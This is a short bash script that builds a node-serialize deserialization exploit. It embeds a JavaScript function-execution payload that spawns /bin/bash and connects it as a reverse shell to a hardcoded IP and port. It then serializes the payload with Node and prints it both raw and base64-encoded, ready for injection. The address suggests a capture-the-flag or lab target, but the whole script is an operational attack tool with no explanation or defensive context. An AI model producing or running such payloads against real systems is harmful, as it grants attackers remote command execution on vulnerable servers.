#!/bin/bash

# Ip and port setup
IP="10.10.10.10"
PORT=9999

# Set another payload, edit but don't forget to escape any double quotes
test_payload="_\$\$ND_FUNC\$\$_function(){ var net = require(\\\"net\\\"), sh = require(\\\"child_process\\\").exec(\\\"/bin/bash\\\");var client = new net.Socket();client.connect(--PORT--, \\\"--IP--\\\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});}()"


# Node.js serialize payload script
payload="""
var y = {\"email\":\"$test_payload\"}

var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log(payload_serialized);
"""

# paylaod replace
d=${payload}
d="${d/--IP--/$IP}"
d="${d/--PORT--/$PORT}"


dirpath=$(dirname "$0")
fullpath="$dirpath/test_node.js"

cat << EOF > "$fullpath"
$d
EOF

ser_payload=$(node "$fullpath")
rm "$fullpath"

b64=$(echo "$ser_payload"|base64)

echo -en "Payload\n"
echo "$ser_payload"

echo -en "Base64\n"
echo "$b64"
